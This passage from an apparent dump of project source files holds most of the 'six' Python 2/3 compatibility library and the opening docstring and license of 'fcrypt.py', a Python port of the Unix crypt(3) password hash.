\"httplib\", \"http.client\"),\n    MovedModule(\"email_mime_base\", \"email.MIMEBase\", \"email.mime.base\"),\n    MovedModule(\"email_mime_image\", \"email.MIMEImage\", \"email.mime.image\"),\n    MovedModule(\"email_mime_multipart\", \"email.MIMEMultipart\", \"email.mime.multipart\"),\n    MovedModule(\"email_mime_nonmultipart\", \"email.MIMENonMultipart\", \"email.mime.nonmultipart\"),\n    MovedModule(\"email_mime_text\", \"email.MIMEText\", \"email.mime.text\"),\n    MovedModule(\"BaseHTTPServer\", \"BaseHTTPServer\", \"http.server\"),\n    MovedModule(\"CGIHTTPServer\", \"CGIHTTPServer\", \"http.server\"),\n    MovedModule(\"SimpleHTTPServer\", \"SimpleHTTPServer\", \"http.server\"),\n    MovedModule(\"cPickle\", \"cPickle\", \"pickle\"),\n    MovedModule(\"queue\", \"Queue\"),\n    MovedModule(\"reprlib\", \"repr\"),\n    MovedModule(\"socketserver\", \"SocketServer\"),\n    MovedModule(\"_thread\", \"thread\", \"_thread\"),\n    MovedModule(\"tkinter\", \"Tkinter\"),\n    MovedModule(\"tkinter_dialog\", \"Dialog\", \"tkinter.dialog\"),\n    MovedModule(\"tkinter_filedialog\", \"FileDialog\", \"tkinter.filedialog\"),\n    MovedModule(\"tkinter_scrolledtext\", \"ScrolledText\", \"tkinter.scrolledtext\"),\n    MovedModule(\"tkinter_simpledialog\", \"SimpleDialog\", \"tkinter.simpledialog\"),\n    MovedModule(\"tkinter_tix\", \"Tix\", \"tkinter.tix\"),\n    MovedModule(\"tkinter_ttk\", \"ttk\", \"tkinter.ttk\"),\n    MovedModule(\"tkinter_constants\", \"Tkconstants\", \"tkinter.constants\"),\n    MovedModule(\"tkinter_dnd\", \"Tkdnd\", \"tkinter.dnd\"),\n    MovedModule(\"tkinter_colorchooser\", \"tkColorChooser\",\n                \"tkinter.colorchooser\"),\n    MovedModule(\"tkinter_commondialog\", \"tkCommonDialog\",\n                \"tkinter.commondialog\"),\n    MovedModule(\"tkinter_tkfiledialog\", \"tkFileDialog\", \"tkinter.filedialog\"),\n    MovedModule(\"tkinter_font\", \"tkFont\", \"tkinter.font\"),\n    MovedModule(\"tkinter_messagebox\", \"tkMessageBox\", \"tkinter.messagebox\"),\n    MovedModule(\"tkinter_tksimpledialog\", \"tkSimpleDialog\",\n                \"tkinter.simpledialog\"),\n    MovedModule(\"urllib_parse\", __name__ + \".moves.urllib_parse\", \"urllib.parse\"),\n    MovedModule(\"urllib_error\", __name__ + \".moves.urllib_error\", \"urllib.error\"),\n    MovedModule(\"urllib\", __name__ + \".moves.urllib\", __name__ + \".moves.urllib\"),\n    MovedModule(\"urllib_robotparser\", \"robotparser\", \"urllib.robotparser\"),\n    MovedModule(\"xmlrpc_client\", \"xmlrpclib\", \"xmlrpc.client\"),\n    MovedModule(\"xmlrpc_server\", \"SimpleXMLRPCServer\", \"xmlrpc.server\"),\n]\n# Add windows specific modules.\nif sys.platform == \"win32\":\n    _moved_attributes += [\n        MovedModule(\"winreg\", \"_winreg\"),\n    ]\n\nfor attr in _moved_attributes:\n    setattr(_MovedItems, attr.name, attr)\n    if isinstance(attr, MovedModule):\n        _importer._add_module(attr, \"moves.\" + attr.name)\ndel attr\n\n_MovedItems._moved_attributes = _moved_attributes\n\nmoves = _MovedItems(__name__ + \".moves\")\n_importer._add_module(moves, \"moves\")\n\n\nclass Module_six_moves_urllib_parse(_LazyModule):\n\n    \"\"\"Lazy loading of moved objects in six.moves.urllib_parse\"\"\"\n\n\n_urllib_parse_moved_attributes = [\n    MovedAttribute(\"ParseResult\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"SplitResult\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"parse_qs\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"parse_qsl\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"urldefrag\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"urljoin\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"urlparse\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"urlsplit\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"urlunparse\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"urlunsplit\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"quote\", \"urllib\", \"urllib.parse\"),\n    MovedAttribute(\"quote_plus\", \"urllib\", \"urllib.parse\"),\n    MovedAttribute(\"unquote\", \"urllib\", \"urllib.parse\"),\n    MovedAttribute(\"unquote_plus\", \"urllib\", \"urllib.parse\"),\n    MovedAttribute(\"unquote_to_bytes\", \"urllib\", \"urllib.parse\", \"unquote\", \"unquote_to_bytes\"),\n    MovedAttribute(\"urlencode\", \"urllib\", \"urllib.parse\"),\n    MovedAttribute(\"splitquery\", \"urllib\", \"urllib.parse\"),\n    MovedAttribute(\"splittag\", \"urllib\", \"urllib.parse\"),\n    MovedAttribute(\"splituser\", \"urllib\", \"urllib.parse\"),\n    MovedAttribute(\"splitvalue\", \"urllib\", \"urllib.parse\"),\n    MovedAttribute(\"uses_fragment\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"uses_netloc\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"uses_params\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"uses_query\", \"urlparse\", \"urllib.parse\"),\n    MovedAttribute(\"uses_relative\", \"urlparse\", \"urllib.parse\"),\n]\nfor attr in _urllib_parse_moved_attributes:\n    setattr(Module_six_moves_urllib_parse, attr.name, attr)\ndel attr\n\nModule_six_moves_urllib_parse._moved_attributes = _urllib_parse_moved_attributes\n\n_importer._add_module(Module_six_moves_urllib_parse(__name__ + \".moves.urllib_parse\"),\n                      \"moves.urllib_parse\", \"moves.urllib.parse\")\n\n\nclass Module_six_moves_urllib_error(_LazyModule):\n\n    \"\"\"Lazy loading of moved objects in six.moves.urllib_error\"\"\"\n\n\n_urllib_error_moved_attributes = [\n    MovedAttribute(\"URLError\", \"urllib2\", \"urllib.error\"),\n    MovedAttribute(\"HTTPError\", \"urllib2\", \"urllib.error\"),\n    MovedAttribute(\"ContentTooShortError\", \"urllib\", \"urllib.error\"),\n]\nfor attr in _urllib_error_moved_attributes:\n    setattr(Module_six_moves_urllib_error, attr.name, attr)\ndel attr\n\nModule_six_moves_urllib_error._moved_attributes = _urllib_error_moved_attributes\n\n_importer._add_module(Module_six_moves_urllib_error(__name__ + \".moves.urllib.error\"),\n                      \"moves.urllib_error\", \"moves.urllib.error\")\n\n\nclass Module_six_moves_urllib_request(_LazyModule):\n\n    \"\"\"Lazy loading of moved objects in six.moves.urllib_request\"\"\"\n\n\n_urllib_request_moved_attributes = [\n    MovedAttribute(\"urlopen\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"install_opener\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"build_opener\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"pathname2url\", \"urllib\", \"urllib.request\"),\n    MovedAttribute(\"url2pathname\", \"urllib\", \"urllib.request\"),\n    MovedAttribute(\"getproxies\", \"urllib\", \"urllib.request\"),\n    MovedAttribute(\"Request\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"OpenerDirector\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"HTTPDefaultErrorHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"HTTPRedirectHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"HTTPCookieProcessor\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"ProxyHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"BaseHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"HTTPPasswordMgr\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"HTTPPasswordMgrWithDefaultRealm\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"AbstractBasicAuthHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"HTTPBasicAuthHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"ProxyBasicAuthHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"AbstractDigestAuthHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"HTTPDigestAuthHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"ProxyDigestAuthHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"HTTPHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"HTTPSHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"FileHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"FTPHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"CacheFTPHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"UnknownHandler\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"HTTPErrorProcessor\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"urlretrieve\", \"urllib\", \"urllib.request\"),\n    MovedAttribute(\"urlcleanup\", \"urllib\", \"urllib.request\"),\n    MovedAttribute(\"URLopener\", \"urllib\", \"urllib.request\"),\n    MovedAttribute(\"FancyURLopener\", \"urllib\", \"urllib.request\"),\n    MovedAttribute(\"proxy_bypass\", \"urllib\", \"urllib.request\"),\n    MovedAttribute(\"parse_http_list\", \"urllib2\", \"urllib.request\"),\n    MovedAttribute(\"parse_keqv_list\", \"urllib2\", \"urllib.request\"),\n]\nfor attr in _urllib_request_moved_attributes:\n    setattr(Module_six_moves_urllib_request, attr.name, attr)\ndel attr\n\nModule_six_moves_urllib_request._moved_attributes = _urllib_request_moved_attributes\n\n_importer._add_module(Module_six_moves_urllib_request(__name__ + \".moves.urllib.request\"),\n                      \"moves.urllib_request\", \"moves.urllib.request\")\n\n\nclass Module_six_moves_urllib_response(_LazyModule):\n\n    \"\"\"Lazy loading of moved objects in six.moves.urllib_response\"\"\"\n\n\n_urllib_response_moved_attributes = [\n    MovedAttribute(\"addbase\", \"urllib\", \"urllib.response\"),\n    MovedAttribute(\"addclosehook\", \"urllib\", \"urllib.response\"),\n    MovedAttribute(\"addinfo\", \"urllib\", \"urllib.response\"),\n    MovedAttribute(\"addinfourl\", \"urllib\", \"urllib.response\"),\n]\nfor attr in _urllib_response_moved_attributes:\n    setattr(Module_six_moves_urllib_response, attr.name, attr)\ndel attr\n\nModule_six_moves_urllib_response._moved_attributes = _urllib_response_moved_attributes\n\n_importer._add_module(Module_six_moves_urllib_response(__name__ + \".moves.urllib.response\"),\n                      \"moves.urllib_response\", \"moves.urllib.response\")\n\n\nclass Module_six_moves_urllib_robotparser(_LazyModule):\n\n    \"\"\"Lazy loading of moved objects in six.moves.urllib_robotparser\"\"\"\n\n\n_urllib_robotparser_moved_attributes = [\n    MovedAttribute(\"RobotFileParser\", \"robotparser\", \"urllib.robotparser\"),\n]\nfor attr in _urllib_robotparser_moved_attributes:\n    setattr(Module_six_moves_urllib_robotparser, attr.name, attr)\ndel attr\n\nModule_six_moves_urllib_robotparser._moved_attributes = _urllib_robotparser_moved_attributes\n\n_importer._add_module(Module_six_moves_urllib_robotparser(__name__ + \".moves.urllib.robotparser\"),\n                      \"moves.urllib_robotparser\", \"moves.urllib.robotparser\")\n\n\nclass Module_six_moves_urllib(types.ModuleType):\n\n    \"\"\"Create a six.moves.urllib namespace that resembles the Python 3 namespace\"\"\"\n    __path__ = []  # mark as package\n    parse = _importer._get_module(\"moves.urllib_parse\")\n    error = _importer._get_module(\"moves.urllib_error\")\n    request = _importer._get_module(\"moves.urllib_request\")\n    response = _importer._get_module(\"moves.urllib_response\")\n    robotparser = _importer._get_module(\"moves.urllib_robotparser\")\n\n    def __dir__(self):\n        return ['parse', 'error', 'request', 'response', 'robotparser']\n\n_importer._add_module(Module_six_moves_urllib(__name__ + \".moves.urllib\"),\n                      \"moves.urllib\")\n\n\ndef add_move(move):\n    \"\"\"Add an item to six.moves.\"\"\"\n    setattr(_MovedItems, move.name, move)\n\n\ndef remove_move(name):\n    \"\"\"Remove item from six.moves.\"\"\"\n    try:\n        delattr(_MovedItems, name)\n    except AttributeError:\n        try:\n            del moves.__dict__[name]\n        except KeyError:\n            raise AttributeError(\"no such move, %r\" % (name,))\n\n\nif PY3:\n    _meth_func = \"__func__\"\n    _meth_self = \"__self__\"\n\n    _func_closure = \"__closure__\"\n    _func_code = \"__code__\"\n    _func_defaults = \"__defaults__\"\n    _func_globals = \"__globals__\"\nelse:\n    _meth_func = \"im_func\"\n    _meth_self = \"im_self\"\n\n    _func_closure = \"func_closure\"\n    _func_code = \"func_code\"\n    _func_defaults = \"func_defaults\"\n    _func_globals = \"func_globals\"\n\n\ntry:\n    advance_iterator = next\nexcept NameError:\n    def advance_iterator(it):\n        return it.next()\nnext = advance_iterator\n\n\ntry:\n    callable = callable\nexcept NameError:\n    def callable(obj):\n        return any(\"__call__\" in klass.__dict__ for klass in type(obj).__mro__)\n\n\nif PY3:\n    def get_unbound_function(unbound):\n        return unbound\n\n    create_bound_method = types.MethodType\n\n    def create_unbound_method(func, cls):\n        return func\n\n    Iterator = object\nelse:\n    def get_unbound_function(unbound):\n        return unbound.im_func\n\n    def create_bound_method(func, obj):\n        return types.MethodType(func, obj, obj.__class__)\n\n    def create_unbound_method(func, cls):\n        return types.MethodType(func, None, cls)\n\n    class Iterator(object):\n\n        def next(self):\n            return type(self).__next__(self)\n\n    callable = callable\n_add_doc(get_unbound_function,\n         \"\"\"Get the function out of a possibly unbound function\"\"\")\n\n\nget_method_function = operator.attrgetter(_meth_func)\nget_method_self = operator.attrgetter(_meth_self)\nget_function_closure = operator.attrgetter(_func_closure)\nget_function_code = operator.attrgetter(_func_code)\nget_function_defaults = operator.attrgetter(_func_defaults)\nget_function_globals = operator.attrgetter(_func_globals)\n\n\nif PY3:\n    def iterkeys(d, **kw):\n        return iter(d.keys(**kw))\n\n    def itervalues(d, **kw):\n        return iter(d.values(**kw))\n\n    def iteritems(d, **kw):\n        return iter(d.items(**kw))\n\n    def iterlists(d, **kw):\n        return iter(d.lists(**kw))\n\n    viewkeys = operator.methodcaller(\"keys\")\n\n    viewvalues = operator.methodcaller(\"values\")\n\n    viewitems = operator.methodcaller(\"items\")\nelse:\n    def iterkeys(d, **kw):\n        return d.iterkeys(**kw)\n\n    def itervalues(d, **kw):\n        return d.itervalues(**kw)\n\n    def iteritems(d, **kw):\n        return d.iteritems(**kw)\n\n    def iterlists(d, **kw):\n        return d.iterlists(**kw)\n\n    viewkeys = operator.methodcaller(\"viewkeys\")\n\n    viewvalues = operator.methodcaller(\"viewvalues\")\n\n    viewitems = operator.methodcaller(\"viewitems\")\n\n_add_doc(iterkeys, \"Return an iterator over the keys of a dictionary.\")\n_add_doc(itervalues, \"Return an iterator over the values of a dictionary.\")\n_add_doc(iteritems,\n         \"Return an iterator over the (key, value) pairs of a dictionary.\")\n_add_doc(iterlists,\n         \"Return an iterator over the (key, [values]) pairs of a dictionary.\")\n\n\nif PY3:\n    def b(s):\n        return s.encode(\"latin-1\")\n\n    def u(s):\n        return s\n    unichr = chr\n    import struct\n    int2byte = struct.Struct(\">B\").pack\n    del struct\n    byte2int = operator.itemgetter(0)\n    indexbytes = operator.getitem\n    iterbytes = iter\n    import io\n    StringIO = io.StringIO\n    BytesIO = io.BytesIO\n    del io\n    _assertCountEqual = \"assertCountEqual\"\n    if sys.version_info[1] <= 1:\n        _assertRaisesRegex = \"assertRaisesRegexp\"\n        _assertRegex = \"assertRegexpMatches\"\n        _assertNotRegex = \"assertNotRegexpMatches\"\n    else:\n        _assertRaisesRegex = \"assertRaisesRegex\"\n        _assertRegex = \"assertRegex\"\n        _assertNotRegex = \"assertNotRegex\"\nelse:\n    def b(s):\n        return s\n    # Workaround for standalone backslash\n\n    def u(s):\n        return unicode(s.replace(r'\\\\', r'\\\\\\\\'), \"unicode_escape\")\n    unichr = unichr\n    int2byte = chr\n\n    def byte2int(bs):\n        return ord(bs[0])\n\n    def indexbytes(buf, i):\n        return ord(buf[i])\n    iterbytes = functools.partial(itertools.imap, ord)\n    import StringIO\n    StringIO = BytesIO = StringIO.StringIO\n    _assertCountEqual = \"assertItemsEqual\"\n    _assertRaisesRegex = \"assertRaisesRegexp\"\n    _assertRegex = \"assertRegexpMatches\"\n    _assertNotRegex = \"assertNotRegexpMatches\"\n_add_doc(b, \"\"\"Byte literal\"\"\")\n_add_doc(u, \"\"\"Text literal\"\"\")\n\n\ndef assertCountEqual(self, *args, **kwargs):\n    return getattr(self, _assertCountEqual)(*args, **kwargs)\n\n\ndef assertRaisesRegex(self, *args, **kwargs):\n    return getattr(self, _assertRaisesRegex)(*args, **kwargs)\n\n\ndef assertRegex(self, *args, **kwargs):\n    return getattr(self, _assertRegex)(*args, **kwargs)\n\n\ndef assertNotRegex(self, *args, **kwargs):\n    return getattr(self, _assertNotRegex)(*args, **kwargs)\n\n\nif PY3:\n    exec_ = getattr(moves.builtins, \"exec\")\n\n    def reraise(tp, value, tb=None):\n        try:\n            if value is None:\n                value = tp()\n            if value.__traceback__ is not tb:\n                raise value.with_traceback(tb)\n            raise value\n        finally:\n            value = None\n            tb = None\n\nelse:\n    def exec_(_code_, _globs_=None, _locs_=None):\n        \"\"\"Execute code in a namespace.\"\"\"\n        if _globs_ is None:\n            frame = sys._getframe(1)\n            _globs_ = frame.f_globals\n            if _locs_ is None:\n                _locs_ = frame.f_locals\n            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\"\"\"def reraise(tp, value, tb=None):\n    try:\n        raise tp, value, tb\n    finally:\n        tb = None\n\"\"\")\n\n\nif sys.version_info[:2] > (3,):\n    exec_(\"\"\"def raise_from(value, from_value):\n    try:\n        raise value from from_value\n    finally:\n        value = None\n\"\"\")\nelse:\n    def raise_from(value, from_value):\n        raise value\n\n\nprint_ = getattr(moves.builtins, \"print\", None)\nif print_ is None:\n    def print_(*args, **kwargs):\n        \"\"\"The new-style print function for Python 2.4 and 2.5.\"\"\"\n        fp = kwargs.pop(\"file\", sys.stdout)\n        if fp is None:\n            return\n\n        def write(data):\n            if not isinstance(data, basestring):\n                data = str(data)\n            # If the file has an encoding, encode unicode with it.\n            if (isinstance(fp, file) and\n                    isinstance(data, unicode) and\n                    fp.encoding is not None):\n                errors = getattr(fp, \"errors\", None)\n                if errors is None:\n                    errors = \"strict\"\n                data = data.encode(fp.encoding, errors)\n            fp.write(data)\n        want_unicode = False\n        sep = kwargs.pop(\"sep\", None)\n        if sep is not None:\n            if isinstance(sep, unicode):\n                want_unicode = True\n            elif not isinstance(sep, str):\n                raise TypeError(\"sep must be None or a string\")\n        end = kwargs.pop(\"end\", None)\n        if end is not None:\n            if isinstance(end, unicode):\n                want_unicode = True\n            elif not isinstance(end, str):\n                raise TypeError(\"end must be None or a string\")\n        if kwargs:\n            raise TypeError(\"invalid keyword arguments to print()\")\n        if not want_unicode:\n            for arg in args:\n                if isinstance(arg, unicode):\n                    want_unicode = True\n                    break\n        if want_unicode:\n            newline = unicode(\"\\n\")\n            space = unicode(\" \")\n        else:\n            newline = \"\\n\"\n            space = \" \"\n        if sep is None:\n            sep = space\n        if end is None:\n            end = newline\n        for i, arg in enumerate(args):\n            if i:\n                write(sep)\n            write(arg)\n        write(end)\nif sys.version_info[:2] < (3, 3):\n    _print = print_\n\n    def print_(*args, **kwargs):\n        fp = kwargs.get(\"file\", sys.stdout)\n        flush = kwargs.pop(\"flush\", False)\n        _print(*args, **kwargs)\n        if flush and fp is not None:\n            fp.flush()\n\n_add_doc(reraise, \"\"\"Reraise an exception.\"\"\")\n\nif sys.version_info[0:2] < (3, 4):\n    # This does exactly the same what the :func:`py3:functools.update_wrapper`\n    # function does on Python versions after 3.2. It sets the ``__wrapped__``\n    # attribute on ``wrapper`` object and it doesn't raise an error if any of\n    # the attributes mentioned in ``assigned`` and ``updated`` are missing on\n    # ``wrapped`` object.\n    def _update_wrapper(wrapper, wrapped,\n                        assigned=functools.WRAPPER_ASSIGNMENTS,\n                        updated=functools.WRAPPER_UPDATES):\n        for attr in assigned:\n            try:\n                value = getattr(wrapped, attr)\n            except AttributeError:\n                continue\n            else:\n                setattr(wrapper, attr, value)\n        for attr in updated:\n            getattr(wrapper, attr).update(getattr(wrapped, attr, {}))\n        wrapper.__wrapped__ = wrapped\n        return wrapper\n    _update_wrapper.__doc__ = functools.update_wrapper.__doc__\n\n    def wraps(wrapped, assigned=functools.WRAPPER_ASSIGNMENTS,\n              updated=functools.WRAPPER_UPDATES):\n        return functools.partial(_update_wrapper, wrapped=wrapped,\n                                 assigned=assigned, updated=updated)\n    wraps.__doc__ = functools.wraps.__doc__\n\nelse:\n    wraps = functools.wraps\n\n\ndef with_metaclass(meta, *bases):\n    \"\"\"Create a base class with a metaclass.\"\"\"\n    # This requires a bit of explanation: the basic idea is to make a dummy\n    # metaclass for one level of class instantiation that replaces itself with\n    # the actual metaclass.\n    class metaclass(type):\n\n        def __new__(cls, name, this_bases, d):\n            if sys.version_info[:2] >= (3, 7):\n                # This version introduced PEP 560 that requires a bit\n                # of extra care (we mimic what is done by __build_class__).\n                resolved_bases = types.resolve_bases(bases)\n                if resolved_bases is not bases:\n                    d['__orig_bases__'] = bases\n            else:\n                resolved_bases = bases\n            return meta(name, resolved_bases, d)\n\n        @classmethod\n        def __prepare__(cls, name, this_bases):\n            return meta.__prepare__(name, bases)\n    return type.__new__(metaclass, 'temporary_class', (), {})\n\n\ndef add_metaclass(metaclass):\n    \"\"\"Class decorator for creating a class with a metaclass.\"\"\"\n    def wrapper(cls):\n        orig_vars = cls.__dict__.copy()\n        slots = orig_vars.get('__slots__')\n        if slots is not None:\n            if isinstance(slots, str):\n                slots = [slots]\n            for slots_var in slots:\n                orig_vars.pop(slots_var)\n        orig_vars.pop('__dict__', None)\n        orig_vars.pop('__weakref__', None)\n        if hasattr(cls, '__qualname__'):\n            orig_vars['__qualname__'] = cls.__qualname__\n        return metaclass(cls.__name__, cls.__bases__, orig_vars)\n    return wrapper\n\n\ndef ensure_binary(s, encoding='utf-8', errors='strict'):\n    \"\"\"Coerce **s** to six.binary_type.\n\n    For Python 2:\n      - `unicode` -> encoded to `str`\n      - `str` -> `str`\n\n    For Python 3:\n      - `str` -> encoded to `bytes`\n      - `bytes` -> `bytes`\n    \"\"\"\n    if isinstance(s, binary_type):\n        return s\n    if isinstance(s, text_type):\n        return s.encode(encoding, errors)\n    raise TypeError(\"not expecting type '%s'\" % type(s))\n\n\ndef ensure_str(s, encoding='utf-8', errors='strict'):\n    \"\"\"Coerce *s* to `str`.\n\n    For Python 2:\n      - `unicode` -> encoded to `str`\n      - `str` -> `str`\n\n    For Python 3:\n      - `str` -> `str`\n      - `bytes` -> decoded to `str`\n    \"\"\"\n    # Optimization: Fast return for the common case.\n    if type(s) is str:\n        return s\n    if PY2 and isinstance(s, text_type):\n        return s.encode(encoding, errors)\n    elif PY3 and isinstance(s, binary_type):\n        return s.decode(encoding, errors)\n    elif not isinstance(s, (text_type, binary_type)):\n        raise TypeError(\"not expecting type '%s'\" % type(s))\n    return s\n\n\ndef ensure_text(s, encoding='utf-8', errors='strict'):\n    \"\"\"Coerce *s* to six.text_type.\n\n    For Python 2:\n      - `unicode` -> `unicode`\n      - `str` -> `unicode`\n\n    For Python 3:\n      - `str` -> `str`\n      - `bytes` -> decoded to `str`\n    \"\"\"\n    if isinstance(s, binary_type):\n        return s.decode(encoding, errors)\n    elif isinstance(s, text_type):\n        return s\n    else:\n        raise TypeError(\"not expecting type '%s'\" % type(s))\n\n\ndef python_2_unicode_compatible(klass):\n    \"\"\"\n    A class decorator that defines __unicode__ and __str__ methods under Python 2.\n    Under Python 3 it does nothing.\n\n    To support Python 2 and 3 with a single code base, define a __str__ method\n    returning text and apply this decorator to the class.\n    \"\"\"\n    if PY2:\n        if '__str__' not in klass.__dict__:\n            raise ValueError(\"@python_2_unicode_compatible cannot be applied \"\n                             \"to %s because it doesn't define __str__().\" %\n                             klass.__name__)\n        klass.__unicode__ = klass.__str__\n        klass.__str__ = lambda self: self.__unicode__().encode('utf-8')\n    return klass\n\n\n# Complete the moves implementation.\n# This code is at the end of this module to speed up module loading.\n# Turn this module into a package.\n__path__ = []  # required for PEP 302 and PEP 451\n__package__ = __name__  # see PEP 366 @ReservedAssignment\nif globals().get(\"__spec__\") is not None:\n    __spec__.submodule_search_locations = []  # PEP 451 @UndefinedVariable\n# Remove other six meta path importers, since they cause problems. This can\n# happen if six is removed from sys.modules and then reloaded. (Setuptools does\n# this for some reason.)\nif sys.meta_path:\n    for i, importer in enumerate(sys.meta_path):\n        # Here's some real nastiness: Another \"instance\" of the six module might\n        # be floating around. Therefore, we can't use isinstance() to check for\n        # the six meta path importer, since the other six instance will have\n        # inserted an importer with different class.\n        if (type(importer).__name__ == \"_SixMetaPathImporter\" and\n                importer.name == __name__):\n            del sys.meta_path[i]\n            break\n    del i, importer\n# Finally, add the importer to the meta path import hook.\nsys.meta_path.append(_importer)\n", "thirdparty/fcrypt/fcrypt.py": "# fcrypt.py\n\n\"\"\"Unix crypt(3) password hash algorithm.\n\nThis is a port to Python of the standard Unix password crypt function.\nIt's a single self-contained source file that works with any version\nof Python from version 1.5 or higher.  The code is based on Eric\nYoung's optimised crypt in C.\n\nPython fcrypt is intended for users whose Python installation has not\nhad the crypt module enabled, or whose C library doesn't include the\ncrypt function.  See the documentation for the Python crypt module for\nmore information:\n\n  http://www.python.org/doc/current/lib/module-crypt.html\n\nAn alternative Python crypt module that uses the MD5 algorithm and is\nmore secure than fcrypt is available from michal j wallace at:\n\n  http://www.sabren.net/code/python/crypt/index.php3\n\nThe crypt() function is a one-way hash function, intended to hide a\npassword such that the only way to find out the original password is\nto guess values until you get a match.  If you need to encrypt and\ndecrypt data, this is not the module for you.\n\nThere are at least two packages providing Python cryptography support:\nM2Crypto at <http://www.pobox.org.sg/home/ngps/m2/>, and amkCrypto at\n<http://www.amk.ca/python/code/crypto.html>.\n\nFunctions:\n\n  crypt() -- return hashed password\n\"\"\"\n\n__author__ = 'Carey Evans <careye@spamcop.net>'\n__version__ = '1.3.1'\n__date__ = '21 February 2004'\n__credits__ = '''michal j wallace for inspiring me to write this.\nEric Young for the C code this module was copied from.'''\n\n__all__ = ['crypt']\n\n\n# Copyright (C) 2000, 2001, 2004  Carey Evans  <careye@spamcop.net>\n#\n# Permission to use, copy, modify, and distribute this software and\n# its documentation for any purpose and without fee is hereby granted,\n# provided that the above copyright notice appear in all copies and\n# that both that copyright notice and this permission notice appear in\n# supporting documentation.\n#\n# CAREY EVANS DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS SOFTWARE,\n# INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS, IN NO\n# EVENT SHALL CAREY EVANS BE LIABLE FOR ANY SPECIAL, INDIRECT OR\n# CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF\n# USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR\n# OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR\n# PERFORMANCE OF THIS SOFTWARE.\n\n# Based on C code by Eric Young (eay@mincom.oz.au), which has the\n# following copyright.  Especially note condition 3, which imposes\n# extra restrictions on top of the standard Python license used above.\n#\n# The fcrypt.c source is available from:\n#     ftp://ftp.psy.uq.oz.au/pub/Crypto/DES/\n\n# ----- BEGIN fcrypt.c LICENSE -----\n#\n# This library is free for commercial and non-commercial use as long as\n# the following conditions are aheared to.  The following conditions\n# apply to all code found in this distribution, be it the RC4, RSA,\n# lhash, DES, etc., code; not just the SSL code.  The SSL documentation\n# included with this distribution is covered by the same copyright terms\n# except that the holder is Tim Hudson (tjh@mincom.oz.au).\n# \n# Copyright remains Eric Young's, and as such any Copyright notices in\n# the code are not to be removed.\n# If this package is used in a product, Eric Young should be given attribution\n# as the author of the parts of the library used.\n# This can be in the form of a textual message at program startup or\n# in documentation (online or textual) provided with the package.\n# \n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions\n# are met:\n# 1. Redistributions of source code must retain the copyright\n#    notice, this list of conditions and the following disclaimer.\n# 2. Redistributions in binary form must reproduce the above copyright\n#    notice, this list of conditions and the following disclaimer in the\n#    documentation and/or other materials provided with the distribution.\n# 3. All advertising materials mentioning features or use of this software\n#    must display the following acknowledgement:\n#    \"This product includes cryptographic software written by\n#     Eric Young (eay@mincom.oz.au)\"\n#    The word 'cryptographic' can be left out if the rouines from the library\n#    being used are not cryptographic related :-).\n# 4. If you include any Windows specific code (or a derivative thereof) from \n#    the apps directory (application code) you must include an acknowledgement:\n#    \"This product includes software written by Tim Hudson (tjh@mincom.oz.au)\"\n# \n# THIS SOFTWARE IS PROVIDED BY ERIC YOUNG ``AS IS'' AND\n# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n# ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE\n# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS\n# OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)\n# HOWEVER CAUSED AND ON 